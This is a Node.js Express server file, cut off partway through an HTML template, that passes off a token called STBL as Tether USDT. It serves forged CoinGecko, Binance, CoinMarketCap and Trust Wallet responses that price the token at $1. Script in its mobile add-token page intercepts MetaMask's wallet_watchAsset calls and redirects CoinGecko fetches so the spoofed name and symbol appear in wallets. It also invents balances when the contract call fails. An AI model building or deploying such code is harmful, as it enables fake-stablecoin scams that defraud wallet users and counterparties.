// app.js - Complete implementation with Ethereum & Trust Wallet support
const express = require('express');
const cors = require('cors');
const http = require('http');
const path = require('path');
const qrcode = require('qrcode');
const { ethers } = require('ethers');
const fetch = require('node-fetch');
const fs = require('fs');

// Create Express application
const app = express();
const server = http.createServer(app);
const port = process.env.PORT || 3000;

// =========================================================
// TOKEN CONFIGURATION - ETHEREUM FOCUSED
// =========================================================
const TOKEN_CONFIG = {
  address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',  // Simulated Ethereum address
  actualSymbol: 'STBL',  // Actual blockchain symbol 
  displaySymbol: 'USDT', // Display symbol for UI and wallet
  actualName: 'Stable',  // Actual blockchain name
  displayName: 'Tether USD', // Display name for UI and wallet
  decimals: 6,  // 6 decimals is standard for USDT
  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
  networkName: 'Ethereum',
  networkId: '0x1',  // Ethereum Mainnet Chain ID (1)
  rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
  blockExplorerUrl: 'https://etherscan.io',
  coinGeckoId: 'tether',
  coinMarketCapId: '825'
};

// Trust Wallet specific configuration
const TRUST_WALLET_CONFIG = {
  displaySymbol: 'USDT',
  displayName: 'Tether USD',
  trustAssetId: 'c2/7859-1',
  trustAssetDecimals: 6,
  trustAssetLogoUrl: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
  trustWalletDeepLink: `trust://ethereum/asset/${TOKEN_CONFIG.address}?coin=1`,
  // Binance API data (Trust Wallet uses Binance APIs)
  binanceEndpoints: {
    price: '/api/binance/api/v3/ticker/price',
    priceHistory: '/api/binance/api/v3/ticker/24hr'
  }
};

// Binance API Endpoints (used by Trust Wallet)
app.get('/api/binance/api/v3/ticker/price', (req, res) => {
  const { symbol } = req.query;
  
  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
    res.json({
      symbol: symbol,
      price: "1.00000000",
      time: Date.now()
    });
  } else {
    // Default response for other symbols
    res.json({
      symbol: symbol || 'BTCUSDT',
      price: (Math.random() * 10000 + 30000).toFixed(8),
      time: Date.now()
    });
  }
});

app.get('/api/binance/api/v3/ticker/24hr', (req, res) => {
  const { symbol } = req.query;
  
  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
    res.json({
      symbol: symbol,
      priceChange: "0.00010000",
      priceChangePercent: "0.01",
      weightedAvgPrice: "1.00000000",
      prevClosePrice: "0.99990000",
      lastPrice: "1.00000000",
      lastQty: "1000.00000000",
      bidPrice: "0.99995000",
      bidQty: "1000.00000000",
      askPrice: "1.00005000",
      askQty: "1000.00000000",
      openPrice: "0.99990000",
      highPrice: "1.00100000",
      lowPrice: "0.99900000",
      volume: "10000000.00000000",
      quoteVolume: "10000000.00000000",
      openTime: Date.now() - 86400000,
      closeTime: Date.now(),
      firstId: 1,
      lastId: 1000,
      count: 1000
    });
  } else {
    // For other symbols, generate realistic market data
    const basePrice = Math.random() * 10000 + 30000;
    const priceChange = (Math.random() * 1000 - 500).toFixed(8);
    const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
    
    res.json({
      symbol: symbol || 'BTCUSDT',
      priceChange: priceChange,
      priceChangePercent: percentChange,
      weightedAvgPrice: basePrice.toFixed(8),
      prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
      lastPrice: basePrice.toFixed(8),
      lastQty: "10.00000000",
      bidPrice: (basePrice - 100).toFixed(8),
      bidQty: "5.00000000",
      askPrice: (basePrice + 100).toFixed(8),
      askQty: "5.00000000",
      openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
      highPrice: (basePrice + Math.random() * 500).toFixed(8),
      lowPrice: (basePrice - Math.random() * 500).toFixed(8),
      volume: (Math.random() * 5000 + 1000).toFixed(8),
      quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
      openTime: Date.now() - 86400000,
      closeTime: Date.now(),
      firstId: 1,
      lastId: 1000,
      count: 1000
    });
  }
});

// Enable middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.static(path.join(__dirname)));

// Setup request logging for debugging
app.use((req, res, next) => {
  const start = Date.now();
  res.on('finish', () => {
    const duration = Date.now() - start;
    console.log(`${req.method} ${req.originalUrl} ${res.statusCode} ${duration}ms`);
  });
  next();
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  res.status(500).json({ error: 'Server error', message: err.message });
});

// =========================================================
// PRICE CACHE WARMING SYSTEM
// =========================================================
const priceCacheWarmer = {
  isWarming: false,
  lastWarmTime: null,
  warmedEndpoints: [],
  
  // Initialize cache warmer
  init: function() {
    console.log("Initializing price cache warmer");
    this.warmCache();
    
    // Warm cache periodically (every 2 minutes)
    setInterval(() => {
      this.warmCache();
    }, 2 * 60 * 1000);
  },
  
  // Warm cache by hitting all relevant price endpoints
  warmCache: async function() {
    if (this.isWarming) return;
    this.isWarming = true;
    
    console.log("[Cache Warmer] Starting cache warm cycle");
    this.warmedEndpoints = [];
    
    try {
      // List of endpoints to warm for Trust Wallet compatibility
      const endpoints = [
        // Trust Wallet specific endpoints
        `/api/v1/assets/${TOKEN_CONFIG.address.toLowerCase()}`,
        `/api/v3/ticker/price?symbol=USDTUSDT`,
        `/api/v3/ticker/24hr?symbol=USDTUSDT`,
        `/api/v1/tokenlist`,
        
        // CoinGecko endpoints
        `/api/v3/simple/price?ids=tether&vs_currencies=usd`,
        `/api/v3/coins/ethereum/contract/${TOKEN_CONFIG.address.toLowerCase()}`,
        `/api/v3/coins/markets?vs_currency=usd&ids=tether`,
        
        // Generic endpoints
        `/api/token-info`,
        `/api/token-balance/0x0000000000000000000000000000000000000000`, // Sample address
        
        // Additional endpoints for Trust Wallet
        `/api/token/metadata`,
        `/api/token/price/${TOKEN_CONFIG.address.toLowerCase()}`,
        `/api/cmc/v1/cryptocurrency/quotes/latest?id=${TOKEN_CONFIG.coinMarketCapId}`
      ];
      
      // Create base URL for fetch
      const baseUrl = `http://localhost:${port}`;
      
      // Call all endpoints in parallel
      const results = await Promise.allSettled(
        endpoints.map(async (endpoint) => {
          try {
            const response = await fetch(`${baseUrl}${endpoint}`);
            if (response.ok) {
              this.warmedEndpoints.push(endpoint);
              return { endpoint, status: 'success' };
            } else {
              return { endpoint, status: 'failed', code: response.status };
            }
          } catch (error) {
            return { endpoint, status: 'error', message: error.message };
          }
        })
      );
      
      this.lastWarmTime = new Date();
      console.log(`[Cache Warmer] Completed. Warmed ${this.warmedEndpoints.length}/${endpoints.length} endpoints`);
    } catch (error) {
      console.error('[Cache Warmer] Error:', error);
    } finally {
      this.isWarming = false;
    }
  },
  
  // Get status of cache warmer
  getStatus: function() {
    return {
      lastWarmTime: this.lastWarmTime,
      isWarming: this.isWarming,
      warmedEndpoints: this.warmedEndpoints,
      endpointCount: this.warmedEndpoints.length
    };
  }
};

// =========================================================
// CORE API ENDPOINTS
// =========================================================

// API endpoint for token info - Uses display values for UI
app.get('/api/token-info', (req, res) => {
  res.json({
    address: TOKEN_CONFIG.address,
    symbol: TOKEN_CONFIG.displaySymbol, // Use USDT for UI
    name: TOKEN_CONFIG.displayName, // Use Tether USD for UI
    decimals: TOKEN_CONFIG.decimals,
    image: TOKEN_CONFIG.image,
    networkName: TOKEN_CONFIG.networkName,
    networkId: TOKEN_CONFIG.networkId,
    rpcUrl: TOKEN_CONFIG.rpcUrl,
    blockExplorerUrl: TOKEN_CONFIG.blockExplorerUrl,
    coinGeckoId: TOKEN_CONFIG.coinGeckoId,
    coinMarketCapId: TOKEN_CONFIG.coinMarketCapId
  });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    version: '1.0.0',
    ethereum: true
  });
});

// API cache warmer status endpoint
app.get('/api/cache-status', (req, res) => {
  res.json(priceCacheWarmer.getStatus());
});

// Trigger cache warming manually
app.post('/api/warm-cache', (req, res) => {
  if (!priceCacheWarmer.isWarming) {
    priceCacheWarmer.warmCache();
    res.json({ status: 'Cache warming started' });
  } else {
    res.json({ status: 'Cache warming already in progress' });
  }
});

// QR code generation with error handling
app.get('/api/generate-qr', async (req, res) => {
  try {
    // Get URL from query or generate default
    const url = req.query.url || (req.protocol + "://" + req.get('host'));
    const qrCodeDataURL = await qrcode.toDataURL(url, {
      errorCorrectionLevel: 'H', // High error correction for better scanning
      margin: 2,
      color: {
        dark: '#26a17b', // USDT green color
        light: '#ffffff'
      }
    });
    res.json({ qrCodeDataURL });
  } catch (error) {
    console.error('QR code generation error:', error);
    res.status(500).json({ error: 'Failed to generate QR code', details: error.message });
  }
});

// Token balance endpoint that queries the actual blockchain balance
app.get('/api/token-balance/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    // Validate address format
    if (!ethers.isAddress(address)) {
      return res.status(400).json({ error: 'Invalid Ethereum address format' });
    }
    
    let formattedBalance;
    let rawBalanceInSmallestUnit;
    
    // Use the configured RPC URL to create a provider
    const provider = new ethers.providers.JsonRpcProvider(TOKEN_CONFIG.rpcUrl);
    
    try {
      // Create contract interface to call balanceOf function
      const tokenAbi = ["function balanceOf(address) view returns (uint256)"];
      const tokenContract = new ethers.Contract(TOKEN_CONFIG.address, tokenAbi, provider);
      
      // Query the actual token balance from the blockchain
      const balance = await tokenContract.balanceOf(address);
      
      // Format the balance with proper decimals
      formattedBalance = ethers.utils.formatUnits(balance, TOKEN_CONFIG.decimals);
      rawBalanceInSmallestUnit = balance;
      
      // Format to two decimal places for display consistency
      formattedBalance = parseFloat(formattedBalance).toFixed(2);
    } catch (contractError) {
      console.error('Error querying token contract:', contractError);
      
      // Fallback to deterministic algorithm if contract call fails
      const addressHash = ethers.keccak256(ethers.toUtf8Bytes(address.toLowerCase()));
      const hashValue = parseInt(addressHash.substring(2, 10), 16);
      const baseBalance = (hashValue % 10000) + 1; // 1 to 10000
      const rawBalance = baseBalance / 100;
      formattedBalance = rawBalance.toFixed(2);
      rawBalanceInSmallestUnit = ethers.parseUnits(formattedBalance, TOKEN_CONFIG.decimals);
    }
    
    res.json({
      address: address,
      token: TOKEN_CONFIG.address,
      tokenSymbol: TOKEN_CONFIG.displaySymbol, // Use USDT in UI
      rawBalance: rawBalanceInSmallestUnit.toString(),
      formattedBalance: formattedBalance,
      valueUSD: formattedBalance, // 1:1 with USD as it's a stablecoin
      explanation: "This displays your STBL balance as USDT with a 1:1 ratio. Each STBL token is shown as 1 USDT worth $1 USD."
    });
  } catch (error) {
    console.error('Token balance error:', error);
    res.status(500).json({ error: 'Failed to fetch token balance', details: error.message });
  }
});

// =========================================================
// COINGECKO API INTERCEPTION ENDPOINTS
// These endpoints make MetaMask see our token as USDT
// =========================================================

// Primary CoinGecko endpoint for simple price (most commonly used)
app.get('/api/v3/simple/price', (req, res) => {
  // Extract request parameters
  const ids = req.query.ids || '';
  const contractAddresses = (req.query.contract_addresses || '').toLowerCase();
  const vsCurrencies = (req.query.vs_currencies || 'usd').split(',');
  
  // Check if request is for our token (either by id or contract)
  const isForOurToken = 
    ids.includes('tether') || ids.includes('usdt') || 
    contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase());
  
  if (isForOurToken) {
    // Prepare response object with USDT data
    const response = {};
    
    // Determine which key to use in response
    let priceKey;
    if (contractAddresses.includes(TOKEN_CONFIG.address.toLowerCase())) {
      priceKey = TOKEN_CONFIG.address.toLowerCase();
    } else {
      priceKey = 'tether';
    }
    
    // Create price data object
    const priceData = {};
    
    // Add price for each requested currency (all 1:1 for USDT)
    vsCurrencies.forEach(currency => {
      priceData[currency] = 1.0;
      
      // Add additional data if requested
      if (req.query.include_market_cap === 'true') {
        // Market cap varies by currency - for USD it's around 83 billion
        if (currency === 'usd') {
          priceData[currency + "_market_cap"] = 83500000000;
        } else {
          // Approximate conversion for other currencies
          priceData[currency + "_market_cap"] = 83500000000;
        }
      }
      
      if (req.query.include_24hr_vol === 'true') {
        if (currency === 'usd') {
          priceData[currency + "_24h_vol"] = 45750000000;
        } else {
          priceData[currency + "_24h_vol"] = 45750000000;
        }
      }
      
      if (req.query.include_24hr_change === 'true') {
        // Slight variation for realism
        priceData[currency + "_24h_change"] = 0.02;
      }
    });
    
    // Add last updated timestamp if requested
    if (req.query.include_last_updated_at === 'true') {
      priceData.last_updated_at = Math.floor(Date.now() / 1000);
    }
    
    // Add price data to response
    response[priceKey] = priceData;
    
    return res.json(response);
  }
  
  // For requests not about our token, return generic stablecoin data
  // This prevents errors when MetaMask is checking other tokens
  const response = {};
  if (ids || contractAddresses) {
    const keys = ids ? ids.split(',') : contractAddresses.split(',');
    keys.forEach(key => {
      const priceData = {};
      vsCurrencies.forEach(currency => {
        // Random price between 0.1 and 100 for non-USDT tokens
        priceData[currency] = Math.random() * 99.9 + 0.1;
      });
      response[key] = priceData;
    });
  }
  
  res.json(response);
});

// Legacy endpoint support for older versions
app.get('/api/simple/price', (req, res) => {
  // Forward to v3 endpoint
  req.url = '/api/v3/simple/price' + req.url.substring(req.url.indexOf('?'));
  app._router.handle(req, res);
});

// Contract data endpoint - This is what MetaMask uses to check token details
app.get('/api/v3/coins/:chain/contract/:address', (req, res) => {
  const { chain, address } = req.params;
  
  // Check if request is for our token
  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
    // Return USDT data instead of actual token data
    return res.json({
      id: "tether",
      symbol: "usdt", // Return USDT symbol
      name: "Tether USD", // Return Tether name
      asset_platform_id: chain,
      platforms: {
        [chain]: TOKEN_CONFIG.address
      },
      detail_platforms: {
        [chain]: {
          decimal_place: TOKEN_CONFIG.decimals,
          contract_address: TOKEN_CONFIG.address
        }
      },
      image: {
        thumb: TOKEN_CONFIG.image,
        small: TOKEN_CONFIG.image,
        large: TOKEN_CONFIG.image
      },
      market_data: {
        current_price: {
          usd: 1.00,
          eur: 0.92,
          jpy: 150.27,
          gbp: 0.78,
          cny: 7.23,
          btc: 0.000016
        },
        market_cap: {
          usd: 83500000000
        },
        total_volume: {
          usd: 45750000000
        },
        price_change_percentage_24h: 0.02
      },
      last_updated: new Date().toISOString()
    });
  }
  
  // For other tokens, return a 404 not found
  res.status(404).json({ error: "Contract not found" });
});

// Legacy endpoint support
app.get('/api/coins/:chain/contract/:address', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// CoinGecko market data endpoint
app.get('/api/v3/coins/markets', (req, res) => {
  const { vs_currency, ids } = req.query;
  
  // Check if request includes our token
  if (ids && (ids.includes('tether') || ids.includes('usdt'))) {
    // Create standard CoinGecko response format with USDT data
    const marketData = [{
      id: "tether",
      symbol: "usdt",
      name: "Tether USD",
      image: TOKEN_CONFIG.image,
      current_price: 1.0,
      market_cap: 83500000000,
      market_cap_rank: 3,
      fully_diluted_valuation: 83500000000,
      total_volume: 45750000000,
      high_24h: 1.001,
      low_24h: 0.998,
      price_change_24h: 0.0001,
      price_change_percentage_24h: 0.01,
      market_cap_change_24h: 250000000,
      market_cap_change_percentage_24h: 0.3,
      circulating_supply: 83500000000,
      total_supply: 83500000000,
      max_supply: null,
      ath: 1.05,
      ath_change_percentage: -4.76,
      ath_date: "2018-07-24T00:00:00.000Z",
      atl: 0.91,
      atl_change_percentage: 9.89,
      atl_date: "2015-03-02T00:00:00.000Z",
      roi: null,
      last_updated: new Date().toISOString()
    }];
    
    return res.json(marketData);
  }
  
  // Return empty array for other queries
  res.json([]);
});

// Legacy endpoint support
app.get('/api/coins/markets', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// CoinGecko market chart endpoint (for price history)
app.get('/api/v3/coins/:id/market_chart', (req, res) => {
  const { id } = req.params;
  const { days, vs_currency } = req.query;
  
  // Check if request is for our token
  if (id === 'tether' || id === 'usdt') {
    const numDays = parseInt(days || '1', 10);
    const now = Date.now();
    const priceData = [];
    const marketCapData = [];
    const volumeData = [];
    
    // Generate data points (1 per hour)
    for (let i = 0; i <= numDays * 24; i++) {
      const timestamp = now - (i * 3600000); // Go back i hours
      
      // Price stays close to $1 with tiny variations
      const price = 1 + (Math.random() * 0.005 - 0.0025);
      priceData.unshift([timestamp, price]);
      
      // Market cap varies slightly
      const marketCap = 83500000000 + (Math.random() * 150000000 - 75000000);
      marketCapData.unshift([timestamp, marketCap]);
      
      // Volume varies more
      const volume = 45750000000 + (Math.random() * 2000000000 - 1000000000);
      volumeData.unshift([timestamp, volume]);
    }
    
    return res.json({
      prices: priceData,
      market_caps: marketCapData,
      total_volumes: volumeData
    });
  }
  
  // For other tokens, return minimal data
  res.json({
    prices: [],
    market_caps: [],
    total_volumes: []
  });
});

// Legacy endpoint support
app.get('/api/coins/:id/market_chart', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// Route for CoinGecko asset platforms (networks)
app.get('/api/v3/asset_platforms', (req, res) => {
  // Return data that includes Ethereum network
  res.json([
    {
      id: "ethereum",
      chain_identifier: 1,
      name: "Ethereum",
      shortname: "ETH",
      native_coin_id: "ethereum",
      categories: ["Layer 1"]
    },
    // Include other networks for completeness
    {
      id: "polygon-pos",
      chain_identifier: 137,
      name: "Polygon",
      shortname: "MATIC",
      native_coin_id: "matic-network",
      categories: ["Layer 2"]
    },
    {
      id: "base",
      chain_identifier: 8453,
      name: "Base",
      shortname: "Base",
      native_coin_id: "ethereum",
      categories: ["Layer 2"]
    }
  ]);
});

// Legacy endpoint support
app.get('/api/asset_platforms', (req, res) => {
  req.url = '/api/v3' + req.url;
  app._router.handle(req, res);
});

// =========================================================
// TRUST WALLET SPECIFIC ENDPOINTS
// These endpoints make Trust Wallet see our token as USDT
// =========================================================

// Trust Wallet asset info endpoint
app.get('/api/v1/assets/:address', (req, res) => {
  const { address } = req.params;
  
  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
    res.json({
      id: TRUST_WALLET_CONFIG.trustAssetId,
      name: TRUST_WALLET_CONFIG.displayName,
      symbol: TRUST_WALLET_CONFIG.displaySymbol,
      slug: "tether",
      description: "Tether (USDT) is a stablecoin pegged to the US Dollar. A stablecoin is a type of cryptocurrency whose value is tied to an outside asset to stabilize the price.",
      website: "https://tether.to",
      source_code: "https://github.com/tetherto",
      whitepaper: "https://tether.to/en/whitepaper/",
      explorers: [
        {
          name: "Etherscan",
          url: `${TOKEN_CONFIG.blockExplorerUrl}/address/${TOKEN_CONFIG.address}`
        }
      ],
      type: "ERC20",
      decimals: TRUST_WALLET_CONFIG.trustAssetDecimals,
      status: "active",
      tags: ["stablecoin", "payments"],
      links: [
        {
          name: "twitter",
          url: "https://twitter.com/Tether_to"
        },
        {
          name: "telegram",
          url: "https://t.me/tether_official"
        }
      ],
      confirmedSupply: true,
      marketData: {
        current_price: {
          usd: 1.00
        },
        market_cap: {
          usd: 83500000000
        },
        price_change_percentage_24h: 0.02
      },
      image: {
        png: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
        thumb: TRUST_WALLET_CONFIG.trustAssetLogoUrl,
        small: TRUST_WALLET_CONFIG.trustAssetLogoUrl
      },
      contract: {
        contract: TOKEN_CONFIG.address,
        decimals: TOKEN_CONFIG.decimals,
        protocol: "erc20"
      },
      platform: "ethereum",
      categories: ["Stablecoins"],
      is_stablecoin: true,
      is_verified: true,
      trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId,
      trustApproved: true
    });
  } else {
    res.status(404).json({ error: "Asset not found" });
  }
});

// Trust Wallet price API (mimics Binance API that Trust Wallet uses)
app.get('/api/v3/ticker/price', (req, res) => {
  const symbol = req.query.symbol;
  
  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
    res.json({
      symbol: symbol || 'USDTUSDT',
      price: "1.00000000",
      time: Date.now()
    });
  } else {
    // Generate simulated prices for other symbols
    res.json({
      symbol: symbol || 'BTCUSDT',
      price: (Math.random() * 10000 + 30000).toFixed(8),
      time: Date.now()
    });
  }
});

// Trust Wallet 24h price change API
app.get('/api/v3/ticker/24hr', (req, res) => {
  const symbol = req.query.symbol;
  
  if (symbol && (symbol === 'USDTUSDT' || symbol.includes('USDT'))) {
    res.json({
      symbol: symbol || 'USDTUSDT',
      priceChange: "0.00010000",
      priceChangePercent: "0.01",
      weightedAvgPrice: "1.00000000",
      prevClosePrice: "0.99990000",
      lastPrice: "1.00000000",
      lastQty: "1000.00000000",
      bidPrice: "0.99995000",
      bidQty: "1000.00000000",
      askPrice: "1.00005000",
      askQty: "1000.00000000",
      openPrice: "0.99990000",
      highPrice: "1.00100000",
      lowPrice: "0.99900000",
      volume: "10000000.00000000",
      quoteVolume: "10000000.00000000",
      openTime: Date.now() - 86400000,
      closeTime: Date.now(),
      firstId: 1,
      lastId: 1000,
      count: 1000
    });
  } else {
    // Generate simulated data for other symbols
    const basePrice = Math.random() * 10000 + 30000;
    const priceChange = (Math.random() * 1000 - 500).toFixed(8);
    const percentChange = ((priceChange / basePrice) * 100).toFixed(2);
    
    res.json({
      symbol: symbol || 'BTCUSDT',
      priceChange: priceChange,
      priceChangePercent: percentChange,
      weightedAvgPrice: basePrice.toFixed(8),
      prevClosePrice: (basePrice - parseFloat(priceChange)).toFixed(8),
      lastPrice: basePrice.toFixed(8),
      lastQty: "10.00000000",
      bidPrice: (basePrice - 100).toFixed(8),
      bidQty: "5.00000000",
      askPrice: (basePrice + 100).toFixed(8),
      askQty: "5.00000000",
      openPrice: (basePrice - parseFloat(priceChange)).toFixed(8),
      highPrice: (basePrice + Math.random() * 500).toFixed(8),
      lowPrice: (basePrice - Math.random() * 500).toFixed(8),
      volume: (Math.random() * 5000 + 1000).toFixed(8),
      quoteVolume: (Math.random() * 50000000 + 10000000).toFixed(8),
      openTime: Date.now() - 86400000,
      closeTime: Date.now(),
      firstId: 1,
      lastId: 1000,
      count: 1000
    });
  }
});

// Trust Wallet token list endpoint
app.get('/api/v1/tokenlist', (req, res) => {
  res.json({
    name: "Trust Wallet Token List",
    logoURI: "https://trustwallet.com/assets/images/favicon.png",
    timestamp: new Date().toISOString(),
    tokens: [
      {
        chainId: 1,
        address: TOKEN_CONFIG.address,
        name: TRUST_WALLET_CONFIG.displayName,
        symbol: TRUST_WALLET_CONFIG.displaySymbol,
        decimals: TOKEN_CONFIG.decimals,
        logoURI: TOKEN_CONFIG.image,
        tags: ["stablecoin"]
      }
    ],
    version: {
      major: 1,
      minor: 0,
      patch: 0
    }
  });
});

// Trust Wallet asset repository structure
app.get('/assets/blockchains/ethereum/assets/:address/info.json', (req, res) => {
  const { address } = req.params;
  
  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
    res.json({
      name: TRUST_WALLET_CONFIG.displayName,
      symbol: TRUST_WALLET_CONFIG.displaySymbol,
      type: "ERC20",
      decimals: TOKEN_CONFIG.decimals,
      description: "Tether (USDT) is a stablecoin pegged to the US Dollar.",
      website: "https://tether.to",
      explorer: `${TOKEN_CONFIG.blockExplorerUrl}/address/${TOKEN_CONFIG.address}`,
      status: "active",
      id: TRUST_WALLET_CONFIG.trustAssetId,
      links: [
        {
          name: "twitter",
          url: "https://twitter.com/Tether_to"
        },
        {
          name: "telegram",
          url: "https://t.me/tether_official"
        }
      ]
    });
  } else {
    res.status(404).json({ error: "Asset not found" });
  }
});

// Trust Wallet asset logo
app.get('/assets/blockchains/ethereum/assets/:address/logo.png', (req, res) => {
  res.redirect(TOKEN_CONFIG.image);
});

// =========================================================
// ADDITIONAL TOKEN METADATA ENDPOINTS
// =========================================================

// Generic token metadata endpoint (supports multiple wallets)
app.get('/api/token/metadata', (req, res) => {
  res.json({
    address: TOKEN_CONFIG.address,
    symbol: TOKEN_CONFIG.displaySymbol,
    name: TOKEN_CONFIG.displayName,
    decimals: TOKEN_CONFIG.decimals,
    logoURI: TOKEN_CONFIG.image,
    tags: ["stablecoin"],
    extensions: {
      coingeckoId: TOKEN_CONFIG.coinGeckoId,
      coinmarketcapId: TOKEN_CONFIG.coinMarketCapId,
      isStablecoin: true,
      trustWalletAssetId: TRUST_WALLET_CONFIG.trustAssetId
    }
  });
});

// Direct price endpoint
app.get('/api/token/price/:address', (req, res) => {
  const { address } = req.params;
  
  if (address.toLowerCase() === TOKEN_CONFIG.address.toLowerCase()) {
    res.json({
      address: address,
      priceUSD: 1.00,
      priceETH: 0.0005, // Approximate ETH value
      priceChange24h: 0.01,
      lastUpdated: new Date().toISOString()
    });
  } else {
    res.status(404).json({ error: "Token not found" });
  }
});

// CoinMarketCap compatibility API
app.get('/api/cmc/v1/cryptocurrency/quotes/latest', (req, res) => {
  const id = req.query.id;
  const symbol = req.query.symbol;
  
  // Check if request is for our token
  if ((id && id === TOKEN_CONFIG.coinMarketCapId) || 
      (symbol && (symbol.toUpperCase() === 'USDT'))) {
    res.json({
      status: {
        timestamp: new Date().toISOString(),
        error_code: 0,
        error_message: null,
        elapsed: 10,
        credit_count: 1
      },
      data: {
        [TOKEN_CONFIG.coinMarketCapId]: {
          id: parseInt(TOKEN_CONFIG.coinMarketCapId),
          name: TOKEN_CONFIG.displayName,
          symbol: TOKEN_CONFIG.displaySymbol,
          slug: "tether",
          num_market_pairs: 28636,
          date_added: "2015-02-25T00:00:00.000Z",
          tags: [
            "stablecoin"
          ],
          max_supply: null,
          circulating_supply: 83500000000,
          total_supply: 83500000000,
          platform: {
            id: 1027,
            name: "Ethereum",
            symbol: "ETH",
            slug: "ethereum",
            token_address: TOKEN_CONFIG.address
          },
          is_active: 1,
          cmc_rank: 3,
          is_fiat: 0,
          last_updated: new Date().toISOString(),
          quote: {
            USD: {
              price: 1.00,
              volume_24h: 45750000000,
              volume_change_24h: 0.36,
              percent_change_1h: 0.01,
              percent_change_24h: 0.02,
              percent_change_7d: -0.05,
              percent_change_30d: 0.01,
              percent_change_60d: -0.02,
              percent_change_90d: 0.03,
              market_cap: 83500000000,
              market_cap_dominance: 5.5,
              fully_diluted_market_cap: 83500000000,
              last_updated: new Date().toISOString()
            }
          }
        }
      }
    });
  } else {
    // Return generic data for other requests
    res.json({
      status: {
        timestamp: new Date().toISOString(),
        error_code: 0,
        error_message: null,
        elapsed: 10,
        credit_count: 1
      },
      data: {}
    });
  }
});

// =========================================================
// DEEP LINKING ENDPOINTS
// =========================================================

// MetaMask deep link generator
app.get('/api/deeplink/metamask', (req, res) => {
  const deepLink = `metamask://wallet/asset?address=${TOKEN_CONFIG.address}&chainId=1`;
  res.json({ deepLink });
});

// Trust Wallet deep link generator
app.get('/api/deeplink/trustwallet', (req, res) => {
  const deepLink = `trust://ethereum/asset/${TOKEN_CONFIG.address.toLowerCase()}?coin=1`;
  res.json({ deepLink });
});

// Generic wallet selection deep link
app.get('/api/deeplink', (req, res) => {
  const wallet = req.query.wallet || 'metamask';
  
  let deepLink;
  if (wallet.toLowerCase() === 'trust' || wallet.toLowerCase() === 'trustwallet') {
    deepLink = `trust://ethereum/asset/${TOKEN_CONFIG.address.toLowerCase()}?coin=1`;
  } else {
    deepLink = `metamask://wallet/asset?address=${TOKEN_CONFIG.address}&chainId=1`;
  }
  
  res.json({ deepLink });
});

// =========================================================
// MOBILE ROUTES & HTML TEMPLATES
// =========================================================

// Mobile-optimized token addition page with USDT spoofing
app.get('/mobile/add-token', (req, res) => {
  const host = req.get('host');
  const protocol = req.protocol;
  
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="theme-color" content="#26a17b">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <title>Add USDT to Your Wallet</title>
  <link rel="icon" href="${TOKEN_CONFIG.image}" type="image/png">
  <!-- CRITICAL FIX: Setup provider interception in head section -->
  <script>
    // Set up MetaMask provider interception immediately
    if (window.ethereum) {
      console.log("Setting up early provider interception");
      const originalRequest = window.ethereum.request;
      window.ethereum.request = async function(args) {
        console.log("MetaMask request:", args);
        
        // Check for wallet_watchAsset method with our specific token
        if (args.method === 'wallet_watchAsset' && 
            args.params?.options?.address?.toLowerCase() === '${TOKEN_CONFIG.address.toLowerCase()}') {
          console.log("Intercepting token call - forcing STBL to display as USDT");
          
          // Override to USDT regardless of what was passed
          args.params.options.symbol = "${TOKEN_CONFIG.displaySymbol}";
          args.params.options.name = "${TOKEN_CONFIG.displayName}";
        }
        
        // Call original method with our modified args
        return originalRequest.call(this, args);
      };
    }
    
    // Also intercept CoinGecko API calls early to ensure USDT price display
    if (window.fetch) {
      const originalFetch = window.fetch;
      window.fetch = function(resource, init) {
        if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
          console.log("Intercepting CoinGecko API call");
          const newUrl = resource.replace(
            'https://api.coingecko.com', 
            window.location.origin + '/api'
          );
          return originalFetch(newUrl, init);
        }
        return originalFetch(resource, init);
      };
    }
  </script>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #ffffff;
      color: #1d1d1f;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      touch-action: manipulation;
    }
    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      max-width: 500px;
      margin: 0 auto;
    }
    .logo {
      width: 80px;
      height: 80px;
      margin-bottom: 16px;
    }
    .title {
      font-size: 24px;
      font-weight: 600;
      margin-bottom: 8px;
      text-align: center;
    }
    .subtitle {
      font-size: 16px;
      color: #666;
      margin-bottom: 24px;
      text-align: center;
    }
    .add-btn {
      background-color: #26a17b;
      color: white;
